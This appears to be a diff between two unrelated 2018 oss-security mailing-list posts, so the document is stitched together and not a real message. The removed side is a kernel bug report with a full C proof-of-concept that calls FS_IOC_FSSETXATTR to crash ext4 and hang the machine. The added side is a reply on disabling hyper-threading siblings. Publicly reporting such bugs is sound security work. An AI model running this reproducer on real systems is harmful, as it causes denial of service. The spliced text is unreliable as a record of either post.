@@ -1,51 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/28/3
-Message-ID: <FDE8244F9EEE7E4F8308F32BD3BEDF01BF9E4799@EXMBX-TJ008.tencent.com>
-Date: Tue, 28 Aug 2018 08:27:50 +0000
-From: zhrzhang(张洪睿) <zhrzhang@...cent.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: Linux kernel: FS_IOC_FSSETXATTR will lead to EXT4-fs shut down
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/06/21/7
+Message-ID: <20180621125049.GA14978@openwall.com>
+Date: Thu, 21 Jun 2018 14:50:49 +0200
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Intel hyper-threading security issues
 Content-Type: text/plain; charset=utf-8
 
-Hello：
-        when I fuzz，I found the kernel will always no output from machine, and error FS_IOC_FSSETXATTR contribute to this.
+On Thu, Jun 21, 2018 at 01:54:16PM +0200, Sven Schwedas wrote:
+> On 2018-06-21 12:28, Lukas Odzioba wrote:
+> > Or use cpu hotplug mechanism, which should be way more convenient:
+> > https://www.kernel.org/doc/html/v4.17/core-api/cpu_hotplug.html
+> 
+> Hotplug doesn't seem differentiate between HT threads and physical
+> cores,
 
-        the syzlog is as below:
+This isn't exactly the question to ask: first vs. second thread in a
+core aren't any different, neither of them is "the physical core" unless
+you choose not to use the other.
 
-r0 = creat(&(0x7f0000000140)='./file0\x00', 0x0)
-ioctl$FS_IOC_FSSETXATTR(r0, 0x8004587d, &(0x7f0000000080)={0x0, 0x0, 0x0, 0x8})
+And you can obtain the needed information from /proc/cpuinfo or
+/sys/devices/system/cpu/cpu*/topology/* to choose which logical CPUs you
+disable (so that you leave only one per physical core).
 
-        the poc will show like this:
+On a related note, attached is a generic Linux /proc/cpuinfo parser I
+wrote a couple of years ago for SMT-aware thread affinity settings in a
+userspace program.  This can be used e.g. by a program not wanting to
+run trusted vs. untrusted threads on the same physical core, or on the
+same physical CPU chip if there's more than one.  It can also be used
+for performance optimization.  Please feel free to reuse.
 
-#define _GNU_SOURCE
+> will setting maxcpus=2 on a 2 cores+HT machine reliably disable
+> HT, or can it disable one core and keep HT active on the other?
 
-#include <endian.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
-#include <unistd.h>
+The latter.  It's not reliable, except maybe on a specific machine with
+a specific kernel version.
 
-uint64_t r[1] = {0xffffffffffffffff};
+Alexander
 
-int main(void)
-{
-syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
-long res = 0;
-memcpy((void*)0x20000140, "./file0", 8);
-res = syscall(__NR_creat, 0x20000140, 0);
-if (res != -1)
-r[0] = res;
-*(uint32_t*)0x20000080 = 0;
-*(uint32_t*)0x20000084 = 0;
-*(uint32_t*)0x20000088 = 0;
-*(uint32_t*)0x2000008c = 8;
-*(uint32_t*)0x20000090 = 0;
-*(uint64_t*)0x20000098 = 0;
-syscall(__NR_ioctl, r[0], 0x8004587d, 0x20000080);
-return 0;
-}
-________________________________
-zhrzhang(张洪睿)
+View attachment "cpuinfo.h" of type "text/x-c" (1303 bytes)
+
+View attachment "cpuinfo.c" of type "text/x-c" (3804 bytes)
